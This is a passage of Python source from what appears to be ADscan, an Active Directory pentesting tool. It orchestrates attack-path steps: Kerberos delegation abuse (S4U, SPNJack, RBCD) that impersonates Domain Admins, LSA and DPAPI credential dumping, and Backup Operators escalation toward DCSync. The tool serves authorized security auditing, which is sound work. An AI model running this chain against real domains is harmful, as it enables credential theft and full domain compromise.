                    # `to_label` is the target computer node (e.g.
                    # "WINTERFELL$@NORTH...") which is informational only —
                    # `exploit_delegation_constrained` needs the SPN.
                    # The constrained delegation type (with/without protocol
                    # transition) is auto-handled by kerbad's S4U2Self+
                    # S4U2Proxy chain — no client-side branching needed.
                    delegated_spn = str(details.get("delegated_spn") or "").strip()
                    if not delegated_spn:
                        print_warning(
                            "AllowedToDelegate edge missing 'delegated_spn' in details — "
                            "cannot dispatch S4U. Re-run the LDAP collector to refresh."
                        )
                        _mark_blocked_step(
                            action,
                            from_label,
                            to_label,
                            kind="unavailable",
                            reason="Edge missing delegated_spn (stale graph?)",
                        )
                        return execution_started

                    from adscan_internal.cli.delegations import (  # noqa: PLC0415
                        exploit_delegation_constrained,
                    )
                    exploit_delegation_constrained(
                        shell,
                        domain=domain,
                        username=exec_username,
                        password=password,
                        delegation_to=delegated_spn,
                        # Single-responsibility: this step ONLY mints the S4U
                        # service ticket. The path runner executes the DCSync
                        # edge as the next step (scoped-ticket-first), so never
                        # chain DCSync internally here (it would double-run and
                        # use the ambient ccache instead of the minted ticket).
                        chain_dcsync_followup=False,
                    )
                continue

            if key == "spnjack":
                if not from_label or not to_label:
                    print_warning("Cannot execute SPNJack: missing from/to details.")
                    return execution_started

                # The vehicle SPN to relocate + its current owner + plant mode are
                # stamped on the edge by derive_spnjack_edges (the modeling layer).
                delegated_spn = str(details.get("delegated_spn") or "").strip()
                vehicle_mode = str(details.get("vehicle_mode") or "delspn_from_owner").strip()
                owner_label = str(details.get("vehicle_spn_owner") or "").strip()
                vehicle_owner_samname = owner_label.split("@", 1)[0].strip() or None
                if not delegated_spn:
                    print_warning(
                        "SPNJack edge missing 'delegated_spn' in details — re-run the "
                        "LDAP collector to refresh."
                    )
                    _mark_blocked_step(
                        action, from_label, to_label, kind="unavailable",
                        reason="Edge missing delegated_spn (stale graph?)",
                    )
                    return execution_started

                # P (the delegating principal that holds KCD + T2A4D) is the source.
                exec_username = _resolve_execution_user(
                    shell, domain=domain, context_username=context_username,
                    summary=summary, from_label=from_label,
                )
                password = context_password or _resolve_domain_password(
                    shell, domain, exec_username
                )
                if not password:
                    marked_user = mark_sensitive(exec_username or from_label, "user")
                    print_warning(
                        f"Cannot execute this step: no stored domain credential found for {marked_user}."
                    )
                    _mark_blocked_step(
                        action, from_label, to_label, kind="unavailable",
                        reason="Missing stored credential for execution user",
                    )
                    return execution_started

                # Target computer T: sAMAccountName from the label, FQDN promoted via
                # the canonical Kerberos-SPN normalizer (never a short host / IP).
                from adscan_internal.services._kerberos_spn import (  # noqa: PLC0415
                    normalize_kerberos_target_hostname,
                )
                target_samname = str(to_label).split("@", 1)[0].strip()
                short_host = target_samname.rstrip("$")
                target_fqdn = (
                    normalize_kerberos_target_hostname(short_host, domain)
                    or f"{short_host}.{domain}".lower()
                )
                domain_data = shell.domains_data.get(domain, {})
                dc_ip = resolve_dc_ip(domain_data) or ""
                try:
                    from adscan_internal.services.domain_posture import (  # noqa: PLC0415
                        get_posture,
                    )
                    posture_snapshot = get_posture(shell.domains_data, domain=domain)
                except Exception:  # noqa: BLE001
                    posture_snapshot = None

                # Impersonation target: let the operator choose (Domain Admin
                # default), EXCLUDING Protected Users members and accounts flagged
                # "sensitive and cannot be delegated" — S4U2Self cannot impersonate
                # those, so offering them would mint a doomed ticket. Centralized
                # helper reused across delegation/ADCS/RODC flows; auto-resolves to
                # the default in non-interactive mode.
                from adscan_internal.cli.privileged_target_selection import (  # noqa: PLC0415
                    resolve_privileged_target_user,
                )
                impersonate_user = (
                    resolve_privileged_target_user(
                        shell,
                        domain=domain,
                        purpose="SPNJack impersonation (S4U2Self)",
                        require_domain_admin=True,
                        exclude_not_delegated=True,
                        exclude_protected_users=True,
                    )
                    or "Administrator"
                )

                execution_started = True
                with _active_step_context(
                    action="SPNJack", from_label=from_label, to_label=to_label,
                    notes={"username": exec_username, "delegated_spn": delegated_spn},
                ):
                    try:
                        update_edge_status_by_labels(
                            shell, domain, from_label=from_label, relation="SPNJack",
                            to_label=to_label, status="attempted",
                            notes={"username": exec_username},
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)

                    from adscan_internal.services.exploitation.spnjack_executor import (  # noqa: PLC0415
                        run_execute_spnjack,
                    )
                    spnjack_result = run_execute_spnjack(
                        shell=shell, domain=domain, dc_ip=dc_ip,
                        principal_user=exec_username, principal_secret=password,
                        target_samname=target_samname, target_fqdn=target_fqdn,
                        vehicle_spn=delegated_spn,
                        vehicle_owner_samname=vehicle_owner_samname,
                        vehicle_mode=vehicle_mode,
                        impersonate_user=impersonate_user,
                        posture_snapshot=posture_snapshot,
                    )
                    try:
                        update_edge_status_by_labels(
                            shell, domain, from_label=from_label, relation="SPNJack",
                            to_label=to_label,
                            status="success" if spnjack_result.success else "failed",
                            notes={
                                "username": exec_username,
                                "minted_spns": spnjack_result.minted_spns,
                                "tickets_persisted": spnjack_result.tickets_persisted,
                                "spn_reverted": spnjack_result.spn_reverted,
                                "error": spnjack_result.error,
                            },
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)
                    if not spnjack_result.success:
                        print_warning(
                            f"SPNJack did not complete: "
                            f"{spnjack_result.error or 'unknown error'}."
                        )
                if not spnjack_result.success:
                    # A failed SPNJack means the privileged service ticket the
                    # downstream DCSync / DumpLSA step depends on was never minted —
                    # halt the path via the unified halt mechanism instead of
                    # offering a doomed follow-up.
                    _halt_path_after_failed_step(
                        action=action,
                        from_label=from_label,
                        to_label=to_label,
                        step_index=idx,
                        executable_step_position=executable_step_position,
                        actor=exec_username,
                    )
                    break
                continue

            if key == "allowedtoact":
                # Inbound RBCD. from_label is the trustee (often a group) granted
                # delegation by the target's msDS-AllowedToActOnBehalfOfOtherIdentity;
                # to_label is the target computer. We mint as an owned, SPN-bearing
                # member of the trustee (placed there by the prior AddMember step),
                # impersonating a Domain Admin, to obtain a service-ticket family on
                # the target. Structurally SPNJack without the SPN-relocation phase.
                if not to_label:
                    print_warning("Cannot execute AllowedToAct: missing RBCD target.")
                    return execution_started

                member_user = _resolve_owned_spn_member_for_rbcd(
                    shell, domain=domain, trustee_label=from_label
                )
                if not member_user:
                    _print_allowedtoact_blocked_panel(
                        trustee_label=from_label,
                        target_label=to_label,
                        reason=(
                            "No owned, SPN-bearing principal is a member of the "
                            "trustee, so there is nothing that can run S4U against "
                            "the target."
                        ),
                        next_step=(
                            "compromise a computer account (or an account with an "
                            "SPN) that belongs to the trustee, or gain write access "
                            "to the trustee group to add one."
                        ),
                    )
                    _mark_blocked_step(
                        action, from_label, to_label, kind="unavailable",
                        reason="No owned SPN-bearing trustee member",
                    )
                    return execution_started

                member_secret = _resolve_domain_password(shell, domain, member_user)
                _member_is_ccache_only = False
                if member_secret:
                    try:
                        from adscan_internal.services.pivot_auth_context_service import (  # noqa: PLC0415
                            _looks_like_ccache,
                        )
                        _member_is_ccache_only = _looks_like_ccache(member_secret)
                    except Exception:  # noqa: BLE001
                        _member_is_ccache_only = False
                if not member_secret or _member_is_ccache_only:
                    reason = (
                        "the only stored credential for "
                        f"{mark_sensitive(member_user, 'user')} is a Kerberos ccache, "
                        "but RBCD must re-forge the S4U2Self ticket forwardable with "
                        "the account's long-term key (password / NT hash)."
                        if _member_is_ccache_only
                        else f"no stored credential for {mark_sensitive(member_user, 'user')}."
                    )
                    _print_allowedtoact_blocked_panel(
                        trustee_label=from_label,
                        target_label=to_label,
                        reason=reason,
                        next_step=(
                            f"recover {mark_sensitive(member_user, 'user')}'s password "
                            "or NT hash (e.g. via the account's own compromise path)."
                        ),
                    )
                    _mark_blocked_step(
                        action, from_label, to_label, kind="unavailable",
                        reason=(
                            "Trustee member credential is ccache-only (no long-term key)"
                            if _member_is_ccache_only
                            else "Missing stored credential for trustee member"
                        ),
                    )
                    return execution_started

                from adscan_internal.services._kerberos_spn import (  # noqa: PLC0415
                    normalize_kerberos_target_hostname,
                )
                target_samname = str(to_label).split("@", 1)[0].strip()
                short_host = target_samname.rstrip("$")
                target_fqdn = (
                    normalize_kerberos_target_hostname(short_host, domain)
                    or f"{short_host}.{domain}".lower()
                )
                domain_data = shell.domains_data.get(domain, {})
                dc_ip = resolve_dc_ip(domain_data) or ""
                try:
                    from adscan_internal.services.domain_posture import (  # noqa: PLC0415
                        get_posture,
                    )
                    posture_snapshot = get_posture(shell.domains_data, domain=domain)
                except Exception:  # noqa: BLE001
                    posture_snapshot = None

                # Impersonation target + logon recovery. For an RBCD against a DC,
                # the DC's OWN machine account is the proven DCSync path (it holds
                # replication rights AND can always network-logon to itself); a
                # Domain Admin may be DENIED a network logon on the DC
                # (STATUS_LOGON_TYPE_NOT_GRANTED). The centralized retry loop
                # (st_logon_retry) drives select -> mint -> probe and, on a
                # network-logon denial, caches the principal + renders the premium
                # card + RE-SELECTS in place (denied excluded) — no full path
                # re-run. Per-step specifics are the callbacks below.
                from adscan_internal.cli.privileged_target_selection import (  # noqa: PLC0415
                    resolve_privileged_target_candidates,
                    resolve_privileged_target_user,
                )
                from adscan_internal.services.domain_controller_classifier import (  # noqa: PLC0415
                    is_dc_host,
                )
                from adscan_internal.services.exploitation.rbcd_act_executor import (  # noqa: PLC0415
                    run_execute_rbcd_act,
                )
                from adscan_internal.services.exploitation.st_logon_retry import (  # noqa: PLC0415
                    run_st_mint_with_logon_retry,
                )

                _target_is_dc = is_dc_host(
                    host=target_fqdn, domains_data=shell.domains_data, domain=domain
                )

                def _select_impersonation(excluded: set[str]) -> str | None:
                    # `excluded` = principals already denied a network logon on this
                    # host (the loop recomputes it each iteration, so a just-denied
                    # principal is gone). No hardcoded fallback: if nothing eligible
                    # is resolved/entered (or the operator cancels), return None and
                    # let the loop stop cleanly rather than guess a principal.
                    if _target_is_dc:
                        # ONE merged prompt: DC machine account (recommended — it
                        # always network-logs-on to itself) + the eligible DAs.
                        from adscan_core.output import (  # noqa: PLC0415
                            questionary_select_index,
                        )

                        cands = resolve_privileged_target_candidates(
                            shell,
                            domain=domain,
                            purpose="AllowedToAct impersonation (RBCD S4U)",
                            require_domain_admin=True,
                            exclude_not_delegated=True,
                            exclude_protected_users=True,
                            exclude_principals=excluded or None,
                            exclude_principals_reason=(
                                "target denied this principal a network logon (cached)"
                            ),
                        )
                        options = [
                            f"{target_samname}  (DC machine account — recommended: reliable DCSync, always network-logon)",
                        ]
                        options += [
                            f"{c}  (Domain Admin — may be denied network logon on the DC)"
                            for c in cands
                        ]
                        choice = questionary_select_index(
                            title=(
                                f"Impersonation target for RBCD against the DC {target_samname}"
                            ),
                            options=options,
                            default_idx=0,
                            shell=shell,
                        )
                        pick = choice or 0
                        return target_samname if pick == 0 else cands[pick - 1]
                    return resolve_privileged_target_user(
                        shell,
                        domain=domain,
                        purpose="AllowedToAct impersonation (RBCD S4U)",
                        require_domain_admin=True,
                        exclude_not_delegated=True,
                        exclude_protected_users=True,
                        exclude_principals=excluded or None,
                        exclude_principals_reason=(
                            "target denied this principal a network logon (cached)"
                        ),
                    )

                def _mint_rbcd(principal: str):
                    return run_execute_rbcd_act(
                        shell=shell, domain=domain, dc_ip=dc_ip,
                        member_user=member_user, member_secret=member_secret,
                        target_samname=target_samname, target_fqdn=target_fqdn,
                        impersonate_user=principal,
                        posture_snapshot=posture_snapshot,
                    )

                def _probe_logon(ccache_path: str) -> tuple[bool, str | None]:
                    return _probe_ticket_network_logon(
                        domain=domain, target_ip=dc_ip, target_fqdn=target_fqdn,
                        kdc_ip=dc_ip, ccache_path=ccache_path,
                    )

                def _mark_attempted(principal: str) -> None:
                    try:
                        update_edge_status_by_labels(
                            shell, domain, from_label=from_label,
                            relation="AllowedToAct", to_label=to_label,
                            status="attempted",
                            notes={"member": member_user, "impersonate": principal},
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)

                def _denied_panel(principal: str, host: str, attempt: int) -> None:
                    _print_st_logon_denied_panel(
                        principal=principal, host=host, attempt=attempt,
                        is_dc=_target_is_dc,
                    )

                execution_started = True
                with _active_step_context(
                    action="AllowedToAct", from_label=from_label, to_label=to_label,
                    notes={"member": member_user},
                ):
                    retry = run_st_mint_with_logon_retry(
                        shell=shell, domain=domain, target_host=target_fqdn,
                        select_principal=_select_impersonation,
                        mint=_mint_rbcd,
                        probe=_probe_logon,
                        on_attempt=_mark_attempted,
                        on_logon_denied=_denied_panel,
                    )
                    impersonate_user = retry.impersonate_user
                    rbcd_result = retry.mint_result
                    try:
                        update_edge_status_by_labels(
                            shell, domain, from_label=from_label,
                            relation="AllowedToAct", to_label=to_label,
                            status="success" if retry.success else "failed",
                            notes={
                                "member": member_user,
                                "impersonated_user": impersonate_user,
                                "minted_spns": getattr(rbcd_result, "minted_spns", []),
                                "tickets_persisted": getattr(
                                    rbcd_result, "tickets_persisted", 0
                                ),
                                "denied_principals": retry.denied_principals,
                                "error": getattr(rbcd_result, "error", None)
                                or retry.last_error,
                            },
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)

                if not retry.success:
                    # Surface WHY, then halt — the downstream DCSync/DumpLSA depends
                    # on a usable ticket against this host.
                    if retry.mint_failed:
                        print_warning(
                            "AllowedToAct did not complete: "
                            f"{retry.last_error or 'unknown error'}."
                        )
                    elif retry.exhausted:
                        _print_st_logon_exhausted_panel(
                            host=target_fqdn,
                            denied_principals=retry.denied_principals,
                            is_dc=_target_is_dc,
                        )
                    if retry.cancelled:
                        print_warning(
                            "AllowedToAct: no impersonation target selected — "
                            "skipping this step."
                        )
                        _mark_blocked_step(
                            action, from_label, to_label, kind="unavailable",
                            reason="No impersonation target selected",
                        )
                    else:
                        _halt_path_after_failed_step(
                            action=action,
                            from_label=from_label,
                            to_label=to_label,
                            step_index=idx,
                            executable_step_position=executable_step_position,
                            actor=member_user,
                        )
                    break
                continue

            if key in {"dumplsa", "dumpdpapi"}:
                if not from_label:
                    print_warning(
                        f"Cannot execute {action}: missing source host details."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing source host details",
                    )
                    return execution_started

                source_host = (
                    resolve_netexec_target_for_node_label(
                        shell, domain, node_label=from_label
                    )
                    or ""
                )
                if not source_host:
                    print_warning(
                        f"Cannot execute {action}: source node is not a resolvable host."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Source node is not a resolvable host",
                    )
                    return execution_started

                # Scoped-ticket-first: if a prior step (RBCD/S4U, constrained
                # delegation) minted a service ticket for THIS host, reuse it -
                # the dump executor accepts a .ccache path as the credential and
                # runs as the ticket's impersonated principal. The alias-aware
                # host match guarantees a cifs/<other-host> ticket is never used
                # here. relation=action (dumplsa/dumpdpapi) -> cifs via the
                # central map; preferent matching keeps a TGT-bearing ccache
                # usable even if its own SPN class differs. Fall back to the
                # generic resolver on no match.
                scoped = resolve_execution_credential(
                    shell, domain=domain, host=source_host, relation=action
                )
                if scoped is not None:
                    exec_username, password = scoped
                    print_info_debug(
                        f"attack_paths {action}: reusing host-scoped service ticket "
                        f"for {mark_sensitive(source_host, 'hostname')} as "
                        f"{mark_sensitive(exec_username, 'user')} "
                        f"(ccache={mark_sensitive(password, 'path')})"
                    )
                else:
                    # host=source_host: DumpLSA/DumpDPAPI authenticate via a
                    # NETWORK logon (SMB session_setup) to source_host, so prefer
                    # a principal that host has not already denied.
                    exec_username = _resolve_execution_user(
                        shell,
                        domain=domain,
                        context_username=context_username,
                        summary=summary,
                        from_label=from_label,
                        host=source_host,
                    )
                    password = context_password or _resolve_domain_password(
                        shell, domain, exec_username
                    )
                if not exec_username or not password:
                    marked_user = mark_sensitive(exec_username or from_label, "user")
                    print_warning(
                        f"Cannot execute this step: no stored domain credential found for {marked_user}."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing stored credential for execution user",
                    )
                    return execution_started

                if key == "dumplsa":
                    dump_handler = getattr(shell, "dump_lsa", None)
                else:
                    dump_handler = getattr(shell, "dump_dpapi", None)
                if not callable(dump_handler):
                    print_warning(
                        f"Cannot execute {action}: dump executor is unavailable."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Dump executor unavailable",
                    )
                    return execution_started

                execution_started = True
                with _active_step_context(
                    action=action,
                    from_label=from_label,
                    to_label=to_label,
                    notes={"username": exec_username, "target_host": source_host},
                ):
                    try:
                        update_edge_status_by_labels(
                            shell,
                            domain,
                            from_label=from_label,
                            relation=action,
                            to_label=to_label,
                            status="attempted",
                            notes={
                                "username": exec_username,
                                "target_host": source_host,
                            },
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)

                    dump_handler(
                        domain,
                        exec_username,
                        password,
                        source_host,
                        "false",
                    )

                target_user = _normalize_account(to_label)
                recovered_credential = (
                    _resolve_domain_password(shell, domain, target_user)
                    if target_user
                    else None
                )
                if target_user and not recovered_credential:
                    marked_user = mark_sensitive(target_user, "user")
                    print_warning(
                        f"{action} did not recover a credential for {marked_user}. Stopping this path."
                    )
                    return True
                # Centralised success transition + credential handoff: the dump
                # executor wrote the to_label principal's credential into the
                # store, so promote it into the in-path execution context (the
                # next step runs as the dumped principal, not the executor).
                if target_user and recovered_credential:
                    _handle_successful_credential_step(
                        action,
                        from_label,
                        to_label,
                        notes={
                            "username": exec_username,
                            "target_host": source_host,
                        },
                        captured_principal=target_user,
                        captured_credential=recovered_credential,
                    )
                continue

            if key == "backupoperatorescalation":
                from adscan_internal.cli.backup_operators_escalation import (
                    offer_backup_operators_escalation,
                )
                bo_username = _resolve_execution_user(
                    shell,
                    domain=domain,
                    context_username=context_username,
                    summary=summary,
                    from_label=from_label,
                )
                bo_password = context_password or _resolve_domain_password(
                    shell, domain, bo_username
                )
                if not bo_username or not bo_password:
                    print_warning(
                        f"Cannot execute BackupOperatorEscalation: no credential available for {from_label}."
                    )
                    return execution_started
                _update_attack_path_step_status_at_index(
                    shell,
                    domain=domain,
                    summary=summary,
                    step_index=idx - 1,
                    status="attempted",
                    notes={"user": bo_username},
                )
                success = offer_backup_operators_escalation(
                    shell,
                    domain=domain,
                    username=bo_username,
                    password=bo_password,
                )
                if success:
                    _update_attack_path_step_status_at_index(
                        shell,
                        domain=domain,
                        summary=summary,
                        step_index=idx - 1,
                        status="success",
                        notes={"user": bo_username},
                    )
                    # Promote the recovered DC machine-account credential
                    # (emitted by offer_backup_operators_escalation) into the
                    # in-path execution context so the next step runs as that
                    # principal instead of the Backup Operator.
                    bo_outcome = get_last_ace_execution_outcome(shell) or {}
                    _apply_execution_outcome_context_handoff(bo_outcome)
                    execution_started = True
                else:
                    # The escalation ran but did not recover the DC machine
                    # account the downstream DCSync/secretsdump depends on —
                    # halt instead of attempting a doomed follow-up.
                    _update_attack_path_step_status_at_index(
                        shell,
                        domain=domain,
                        summary=summary,
                        step_index=idx - 1,
                        status="failed",
                        notes={"user": bo_username},
                    )
                    _halt_path_after_failed_step(
                        action=action,
                        from_label=from_label,
                        to_label=to_label,
                        step_index=idx,
                        executable_step_position=executable_step_position,
                        actor=bo_username,
                    )
                    break
                continue

            # Unknown supported key shouldn't happen due to pre-check, but keep safe.
            _record_attack_path_execution_event(
                shell,
                domain=domain,
                summary=summary,
                event_stage="step_blocked",
                message=f"Cannot execute this step yet: {action}",
                step_index=idx,
                total_steps=total_executable_steps,
                executable_step_index=executable_step_position,
                last_executable_idx=last_executable_idx,
                action=action,
                from_label=from_label,
                to_label=to_label,
                step_status="blocked",
                reason="unknown_supported_step",
            )
            print_warning(f"Cannot execute this step yet: {action}")
            return execution_started

        if execution_started:
            _record_attack_path_execution_event(
                shell,
                domain=domain,
                summary=summary,
                event_stage="path_completed",
                message="Attack path execution finished.",
                total_steps=total_executable_steps,
                last_executable_idx=last_executable_idx,
                step_status="completed",
            )
        return execution_started

    finally:
        try:
            if cleanup_scope_owner and local_cleanup_scope_id:
                execute_cleanup_scope(shell, scope_id=local_cleanup_scope_id)
        finally:
            if cleanup_scope_owner and local_cleanup_scope_id:
                discard_cleanup_scope(shell, scope_id=local_cleanup_scope_id)
            clear_attack_path_execution(shell)


def offer_attack_paths_for_execution(
    shell: Any,
    domain: str,
    *,
    start: str,
    max_depth: int = 10,
    max_display: int = 20,
    target: str = "highvalue",
    # object = terminate at the exact domain object so the full kill-chain to
    # Domain Compromise renders (matches the canonical engine default and
    # do_attack_paths; tier0 would subsume the tail at the Tier-0 class node).
    target_mode: str = "object",
    context_username: str | None = None,
    context_password: str | None = None,
    allow_execute_all: bool = False,
    default_execute_all: bool = False,
    execute_only_statuses: set[str] | None = None,
    retry_attempted: bool = False,
) -> bool:
    """Offer attack paths to the user and optionally execute one.

    Args:
        shell: Shell instance with `_questionary_select` (optional) and attack actions.
        domain: Target domain.
        start: Either a username label or the special value `owned`.
        max_depth: Max path depth for pathfinding.
        max_display: Max number of paths to show in the summary and selection.
        target: Target scope — ``"highvalue"`` (default), ``"all"``, or ``"lowpriv"``.
        context_username/context_password: When provided, use these credentials for
            execution attempts (useful for `ask_for_user_privs` flows).

    Returns:
        True if an execution attempt was started, False otherwise.
    """
    start_norm = (start or "").strip().lower()
    _compute_summaries = _build_attack_path_summary_provider(
        shell,
        domain=domain,
        start=start,
        max_depth=max_depth,
        target=target,
        target_mode=target_mode,
    )

    try:
        summaries = _compute_summaries()
    except RecursionError as exc:
        telemetry.capture_exception(exc)
        marked_domain = mark_sensitive(domain, "domain")
        print_error(
            "Attack-path computation failed while expanding nested group memberships "
            f"for {marked_domain}. The environment appears to have deep or cyclic "
            "group nesting."
        )
        return False
    if not summaries:
        _print_no_attack_paths_warning(
            domain=domain,
            start=start,
            start_norm=start_norm,
            target=target,
            target_mode=target_mode,
        )
        return False

    return offer_attack_paths_for_execution_summaries(
        shell,
        domain,
        summaries=summaries,
        max_display=max_display,
        search_mode_label=_target_search_mode_label(
            target=target, target_mode=target_mode
        ),
        context_username=context_username,
        context_password=context_password,
        allow_execute_all=allow_execute_all,
        default_execute_all=default_execute_all,
        execute_only_statuses=execute_only_statuses,
        retry_attempted=retry_attempted,
        recompute_summaries=_compute_summaries,
    )


def _target_scope_label(*, target: str, target_mode: str) -> str:
    """Return a user-facing label for the current target filtering mode."""
    if target == "all":
        return "all targets"
    if target == "lowpriv":
        return "low-privilege targets"
    if str(target_mode or "impact").strip().lower() == "tier0":
        return "Tier-0 targets"
    return "high-value targets"


def _target_search_mode_label(*, target: str, target_mode: str) -> str:
    """Return a compact label describing the current attack-path search mode."""
    if target == "all":
        return describe_search_mode_label("pivot")
    if target == "lowpriv":
        return describe_search_mode_label("low_priv")
    if str(target_mode or "impact").strip().lower() == "tier0":
        return describe_search_mode_label("direct_compromise")
    return describe_search_mode_label("followup_terminal")


def _resolve_summary_search_mode_label(
    summary: dict[str, Any],
    *,
    default_search_mode_label: str | None,
    show_sections: bool,
) -> str | None:
    """Return the effective search-mode label for one rendered/executed path.

    When the UX is rendering mixed high-value + pivot results in one table
    (`target=all`), the runtime follow-up logic must key off the selected path,
    not off a single global label for the whole screen. Otherwise pivot-only
    follow-ups get skipped for non-HV paths shown in the merged view.
    """
    if show_sections:
        return _summary_search_mode_label(summary)
    return default_search_mode_label


def _print_no_attack_paths_warning(
    *,
    domain: str,
    start: str,
    start_norm: str,
    target: str,
    target_mode: str,
) -> None:
    """Emit a consistent warning when no attack paths are available."""
    marked_domain = mark_sensitive(domain, "domain")
    scope = _target_scope_label(
        target=target,
        target_mode=target_mode,
    )
    if start_norm == "owned":
        print_warning(
            f"No attack paths found from owned users to {scope} for {marked_domain}."
        )
        return
    marked_user = mark_sensitive(start, "user")
    print_warning(
        f"No attack paths found for {marked_user} to {scope} in {marked_domain}."
    )


def _build_attack_path_summary_provider(
    shell: Any,
    *,
    domain: str,
    start: str,
    max_depth: int,
    target: str,
    target_mode: str,
    display_friendly: bool | None = None,
) -> Callable[[], list[dict[str, Any]]]:
    """Build a reusable summary provider for a specific attack-path scope."""
    start_norm = (start or "").strip().lower()

    def _compute_summaries() -> list[dict[str, Any]]:
        if start_norm == "owned":
            from adscan_internal.services.attack_graph_service import (
                get_attack_path_owned_principal_labels,
            )

            owned_users = get_attack_path_owned_principal_labels(
                shell,
                domain,
                include_trusted_domains=True,
            )
            if not owned_users:
                return []
            return get_attack_path_summaries(
                shell,
                domain,
                scope="owned",
                max_depth=max_depth,
                max_paths=None,
                target=target,
                target_mode=target_mode,
                display_friendly=display_friendly,
            )

        marked_domain = mark_sensitive(domain, "domain")
        marked_user = mark_sensitive(start, "user")
        print_info(f"Searching attack paths for {marked_user} in {marked_domain}...")
        return get_attack_path_summaries(
            shell,
            domain,
            scope="user",
            username=start,
            max_depth=max_depth,
            max_paths=None,
            target=target,
            target_mode=target_mode,
            display_friendly=display_friendly,
        )

    return _compute_summaries


def offer_attack_paths_with_non_high_value_fallback(
    shell: Any,
    domain: str,
    *,
    start: str,
    max_depth: int = 10,
    max_display: int = 20,
    target: str = "highvalue",
    target_mode: str = "object",
    display_friendly: bool | None = None,
    context_username: str | None = None,
    context_password: str | None = None,
    allow_execute_all: bool = False,
    default_execute_all: bool = False,
    execute_only_statuses: set[str] | None = None,
    retry_attempted: bool = False,
    snapshot_scope: str | None = None,
) -> bool:
    """Offer attack paths, with optional prioritized-target fallback broadening.

    When ``target`` is ``"highvalue"`` (default):
        - Shows Tier-0 or high-value paths first.
        - In ``ctf`` mode automatically broadens to all targets when none found.
        - In ``audit`` mode prompts the operator before broadening.

    When ``target`` is ``"all"`` or ``"lowpriv"``:
        - Goes directly to that target mode without the narrowing prompt flow.
        - Intended for bounded scopes (single user, owned) where running the
          broader query is affordable.
    """
    start_norm = (start or "").strip().lower()

    if target != "highvalue":
        # Direct mode — skip the narrowing/fallback prompt, go straight to target.
        direct_compute = _build_attack_path_summary_provider(
            shell,
            domain=domain,
            start=start,
            max_depth=max_depth,
            target=target,
            target_mode=target_mode,
            display_friendly=display_friendly,
        )
        try:
            direct_summaries = direct_compute()
        except RecursionError as exc:
            telemetry.capture_exception(exc)
            print_error(
                "Attack-path computation failed while expanding nested group memberships "
                f"for {mark_sensitive(domain, 'domain')}. The environment appears to have "
                "deep or cyclic group nesting."
            )
            return False
        if not direct_summaries:
            _print_no_attack_paths_warning(
                domain=domain,
                start=start,
                start_norm=start_norm,
                target=target,
                target_mode=target_mode,
            )
            return False
        if target == "all":
            return _offer_sectioned_attack_paths(
                shell,
                domain,
                summaries=direct_summaries,
                max_display=max_display,
                target_mode=target_mode,
                context_username=context_username,
                context_password=context_password,
                allow_execute_all=allow_execute_all,
                default_execute_all=default_execute_all,
                execute_only_statuses=execute_only_statuses,
                retry_attempted=retry_attempted,
                recompute_summaries=direct_compute,
                snapshot_scope=snapshot_scope or start_norm or "domain",
                snapshot_target="all",
                snapshot_target_mode=target_mode,
            )
        return offer_attack_paths_for_execution_summaries(
            shell,
            domain,
            summaries=direct_summaries,
            max_display=max_display,
            search_mode_label=_target_search_mode_label(
                target=target, target_mode=target_mode
            ),
            context_username=context_username,
            context_password=context_password,
            allow_execute_all=allow_execute_all,
            default_execute_all=default_execute_all,
            execute_only_statuses=execute_only_statuses,
            retry_attempted=retry_attempted,
            recompute_summaries=direct_compute,
            snapshot_scope=snapshot_scope or start_norm or "domain",
            snapshot_target=target,
            snapshot_target_mode=target_mode,
        )

    primary_compute = _build_attack_path_summary_provider(
        shell,
        domain=domain,
        start=start,
        max_depth=max_depth,
        target="highvalue",
        target_mode=target_mode,
        display_friendly=display_friendly,
    )
    try:
        primary_summaries = primary_compute()
    except RecursionError as exc:
        telemetry.capture_exception(exc)
        marked_domain = mark_sensitive(domain, "domain")
        print_error(
            "Attack-path computation failed while expanding nested group memberships "
            f"for {marked_domain}. The environment appears to have deep or cyclic "
            "group nesting."
        )
        return False

    if primary_summaries:
        return offer_attack_paths_for_execution_summaries(
            shell,
            domain,
            summaries=primary_summaries,
            max_display=max_display,
            search_mode_label=_target_search_mode_label(
                target="highvalue", target_mode=target_mode
            ),
            context_username=context_username,
            context_password=context_password,
            allow_execute_all=allow_execute_all,
            default_execute_all=default_execute_all,
            execute_only_statuses=execute_only_statuses,
            retry_attempted=retry_attempted,
            recompute_summaries=primary_compute,
            snapshot_scope=snapshot_scope or start_norm or "domain",
            snapshot_target="highvalue",
            snapshot_target_mode=target_mode,
        )

    _print_no_attack_paths_warning(
        domain=domain,
        start=start,
        start_norm=start_norm,
        target="highvalue",
        target_mode=target_mode,
    )

    fallback_default = str(getattr(shell, "type", "")).strip().lower() == "ctf"
    marked_domain = mark_sensitive(domain, "domain")
    subject = "owned users" if start_norm == "owned" else mark_sensitive(start, "user")

    message = Text()
    message.append(
        "No paths to Tier-0 or high-value targets were discovered from the current foothold.\n\n",
        style="bold yellow",
    )
    message.append("Scope: ", style="bold")
    message.append(f"{subject}\n")
    message.append("Domain: ", style="bold")
    message.append(f"{marked_domain}\n\n")
    message.append(
        "ADscan can broaden the search to non-high-value targets to identify "
        "pivot opportunities, intermediate control points, and lower-privilege "
        "expansion paths.",
        style="yellow",
    )

    title = (
        "Broadening Attack Path Search"
        if fallback_default
        else "Optional Pivot Path Enumeration"
    )
    print_panel(message, title=title, border_style="yellow", expand=False)

    broaden_search = fallback_default
    if not fallback_default:
        if is_non_interactive(shell=shell):
            print_info_debug(
                "[attack_paths] non-high-value fallback skipped: "
                f"domain={marked_domain} scope={mark_sensitive(start_norm or start, 'text')}"
            )
            broaden_search = False
        else:
            broaden_search = Confirm.ask(
                "Do you want to broaden the search to non-high-value targets now?",
                default=False,
            )
    else:
        print_info(
            "CTF mode active: broadening attack-path search to all reachable targets."
        )

    if not broaden_search:
